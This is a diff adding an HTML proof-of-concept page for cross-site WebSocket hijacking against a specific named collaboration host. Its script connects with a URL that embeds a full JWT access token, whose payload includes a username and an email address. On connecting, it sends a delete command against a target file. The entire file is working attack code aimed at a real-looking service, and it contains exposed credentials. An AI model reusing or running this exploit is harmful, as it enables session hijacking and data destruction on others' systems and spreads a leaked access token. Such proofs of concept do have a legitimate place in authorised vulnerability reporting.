@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSWSH PoC</title>
+</head>
+<body>
+  <h1>Testing CSWSH</h1>
+  <script>
+    // Replace this with the full vulnerable WebSocket URL
+    const ws = new WebSocket("wss://collabora.immunefiles.com/cool/https%3A%2F%2Fprod.immunefiles.com%2Fapi%2Fauth%2Fwopi%2Ffiles%2F844a1q%3Faccess_token%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ik1hc29vZCIsImVtYWlsIjoibWFzb29kLmFzbGFtQHBydWRlbnRiaXQuY29tIiwiY3JlIjoiMjAyNS0wNi0yMSAwNDowMTo0Ny40NzEwMTIiLCJleHAiOjE3NTA1NjQ5MDd9.qu_y8PxuR5xSzww3oz5i-OpahKsNdo-1NPbJuMimsek%26access_token_ttl%3D0/ws?WOPISrc=https%3A%2F%2Fprod.immunefiles.com%2Fapi%2Fauth%2Fwopi%2Ffiles%2F844a1q&compat=/ws ");
+
+    ws.onopen = () => {
+      console.log("WebSocket connected!");
+      // Send a fake/malicious command
+      ws.send('{"command":"delete","target":"important_file"}');
+    };
+
+    ws.onmessage = (event) => {
+      console.log("Server says:", event.data);
+    };
+
+    ws.onerror = (err) => {
+      console.error("WebSocket error:", err);
+    };
+
+    ws.onclose = () => {
+      console.log("WebSocket closed");
+    };
+  </script>
+</body>
+</html>
